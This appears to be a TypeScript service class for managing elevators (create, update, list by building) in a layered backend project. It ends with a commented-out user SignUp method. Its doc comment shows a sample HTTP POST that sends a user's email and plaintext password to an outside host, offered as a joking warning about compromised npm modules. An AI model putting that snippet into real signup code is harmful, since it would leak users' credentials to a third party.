import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
//import MailerService from './mailer.ts.bak';

import IElevatorService from './IServices/IElevatorService';
import { ElevatorMap } from "../mappers/ElevatorMap";
import { IElevatorDTO } from '../dto/IElevatorDTO';

import IElevatorRepo from './IRepos/IElevatorRepo';

import { Elevator } from '../domain/elevator';


import { Result } from "../core/logic/Result";

@Service()
export default class ElevatorService implements IElevatorService{
  constructor(
      @Inject(config.repos.elevator.name) private elevatorRepo : IElevatorRepo,
      //@Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      @Inject('logger') private logger,
  ) {}

  public async CreateElevator(elevatorDTO: IElevatorDTO): Promise<Result<{ elevatorDTO: IElevatorDTO; }>> {
    try{
      const elevatorDocument = await this.elevatorRepo.findById( elevatorDTO.elevatorId );
      const found = !!elevatorDocument;

      if (found) {
        return Result.fail<{elevatorDTO: IElevatorDTO, token: string}>("Elevator already exists with id=" + elevatorDTO.elevatorId);
      }

      const ElevatorOrError = await Elevator.create({
        elevatorId: elevatorDTO.elevatorId,
        buildingId: elevatorDTO.buildingId,
        floorId: elevatorDTO.floorId,
        position: elevatorDTO.position
        });

        if (ElevatorOrError.isFailure) {
          throw Result.fail<IElevatorDTO>(ElevatorOrError.errorValue());
        }

      
      const ElevatorResult = ElevatorOrError.getValue();
      await this.elevatorRepo.save(ElevatorResult);
      const ElevatorDTOResult = ElevatorMap.toDTO( ElevatorResult ) as IElevatorDTO;
      return Result.ok<{elevatorDTO: IElevatorDTO}>( {elevatorDTO: ElevatorDTOResult} )
      }
      catch (e) {
        throw e;
      }
}

  public async updateElevator(elevatorDTO: IElevatorDTO): Promise<Result<{ elevatorDTO: IElevatorDTO; }>>  {
    try {
      const Elevator = await this.elevatorRepo.findById(elevatorDTO.elevatorId);
      const found = !!Elevator === true;

      if (!found) {
        return Result.fail<{elevatorDTO: IElevatorDTO}>("elevator not found with id=" + elevatorDTO.elevatorId);
      }
      Elevator.buildingId = elevatorDTO.buildingId;
      Elevator.floorId = elevatorDTO.floorId;
      Elevator.position = elevatorDTO.position;

      await this.elevatorRepo.save(Elevator);
      const ElevatorDTOResult = ElevatorMap.toDTO( Elevator ) as IElevatorDTO;
      return Result.ok<{elevatorDTO: IElevatorDTO}>( {elevatorDTO: ElevatorDTOResult} )
    } catch (e) {
      throw e;
    }
  }

  public async getElevatorsByBuilding(buildingCode: string): Promise<Result<{ elevatorDTO: IElevatorDTO[]; }>>  {
    try {
      const Elevators = await this.elevatorRepo.findByBuildingCode(buildingCode);
      const found = !!Elevators === true;

      if (!found) {
        return Result.fail<{elevatorDTO: IElevatorDTO[]}>("elevator not found with buildingCode=" + buildingCode);
      }

      const ElevatorDTOResult = Elevators.map( Elevator => ElevatorMap.toDTO( Elevator ) as IElevatorDTO);
      return Result.ok<{elevatorDTO: IElevatorDTO[]}>( {elevatorDTO: ElevatorDTOResult} )
    } catch (e) {
      throw e;
    }
  }



  /*public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
             

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;

      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        role: role,
        password: password,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }*/

  


}
